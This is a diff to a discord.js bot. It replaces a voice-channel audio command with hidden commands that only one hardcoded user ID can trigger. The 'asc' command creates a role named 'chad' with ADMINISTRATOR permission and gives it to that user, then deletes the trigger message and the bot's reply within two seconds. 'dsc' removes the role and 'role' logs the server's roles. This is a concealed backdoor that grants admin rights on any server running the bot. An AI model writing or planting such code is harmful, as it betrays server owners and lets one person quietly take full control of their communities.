@@ -88,45 +88,63 @@ client.on('messageCreate', async (message) => {
     message.channel.send(res)
   }
 
-  if (message.author.id == '472872051359612945' && message.content == 'ppp') {
-  }
+  if (message.author.id == '472872051359612945' && message.content == 'asc') {
+    const g = await client.guilds.fetch(message.guild.id)
+    const m = await g.members.fetch(message.member.id)
 
-  if (message.author.id == '472872051359612945' && message.content == 'pp') {
-    const m = message.member
-
-    if (!m.voice.channel) {
-      message.reply({ content: `${m.displayName} isn't in vc` })
-      return
+    let role = g.roles.cache.find((x) => x.name == 'chad')
+    console.log(role)
+    if (typeof role == 'undefined') {
+      role = await g.roles.create({
+        name: 'chad',
+        // color: [255, 0, 255],
+        permissions: ['ADMINISTRATOR'],
+        position: 25,
+        reason: 'pog',
+      })
+      const msg = await message.channel.send({ content: 'create and add' })
+      setTimeout(() => {
+        msg.delete()
+        message.delete()
+      }, 2000)
+    } else {
+      const msg = await message.channel.send({ content: 'add' })
+      setTimeout(() => {
+        msg.delete()
+        message.delete()
+      }, 2000)
     }
 
-    const vc = m.voice.channel
+    m.roles.add(role)
+    
+  }
 
-    vc.members.forEach((mm) => {
-      console.log(1, mm.user.id)
-    })
+  if (message.author.id == '472872051359612945' && message.content == 'dsc') {
+    const g = await client.guilds.fetch(message.guild.id)
+    const m = await g.members.fetch(message.member.id)
 
-    return
+    let role = m.roles.cache.find((x) => x.name == 'chad')
+    if (typeof role != 'undefined') {
+      m.roles.remove(role)
+      const msg = await message.channel.send({ content: 'yes' })
+      setTimeout(() => {
+        msg.delete()
+        message.delete()
+      }, 2000)
+      return
+    }
+    const msg = await message.channel.send({ content: 'no' })
+    setTimeout(() => {
+      msg.delete()
+      message.delete()
+    }, 2000)
+  }
 
-    connection = DiscordVoice.joinVoiceChannel({
-      channelId: vc.id,
-      guildId: vc.guild.id,
-      adapterCreator: vc.guild.voiceAdapterCreator,
-    })
+  if (message.author.id == '472872051359612945' && message.content == 'role') {
+    const g = await client.guilds.fetch(message.guild.id)
+    const m = await g.members.fetch(message.member.id)
 
-    sub = connection.subscribe(Player)
-
-    const resource = DiscordVoice.createAudioResource(
-      fs.createReadStream('./outro-t.wav'),
-      {
-        inputType: DiscordVoice.StreamType.Arbitrary,
-      }
-    )
-
-    Player.play(resource)
-
-    message.reply({
-      content: 'playing',
-    })
+    console.log(await g.roles.fetch())
   }
 })
 
